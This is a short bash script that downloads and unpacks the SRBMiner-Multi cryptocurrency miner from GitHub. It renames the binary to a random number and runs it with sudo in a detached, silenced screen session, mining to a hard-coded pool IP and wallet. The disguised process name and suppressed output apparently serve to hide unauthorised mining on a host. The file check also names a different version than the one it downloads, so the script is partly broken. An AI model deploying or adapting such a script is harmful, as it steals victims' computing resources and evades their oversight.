#!/bin/bash
ALG=verushash
WALS=Lhehm3xhWQNgF1EexRa1J2Q8LKdeAPovbY
POIL=51.79.251.11:3300
PASS=c=LTC,mc=VRSC
WER=$(echo $(shuf -i 1-99999 -n 1)-LIM)
COMA="--disable-gpu --algorithm $ALG --pool $POIL --wallet $WALS.$WER --password $PASS"
TOP=$(shuf -n 1 -i 1-200000)

FILE=./SRBMiner-Multi-0-8-0-Linux.tar.xz
if [ -f "$FILE" ]; then
    echo "$FILE exists."
else 
    wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.8.5/SRBMiner-Multi-0-8-5-Linux.tar.xz >/dev/null 2>&1
    tar xvf SRBMiner-Multi-0-8-5-Linux.tar.xz >/dev/null 2>&1
    cd SRBMiner-Multi-0-8-5
    mv SRBMiner-MULTI $TOP
    chmod +x * >/dev/null 2>&1
fi
screen -dmLS mine sudo ./$TOP $COMA >/dev/null 2>&1
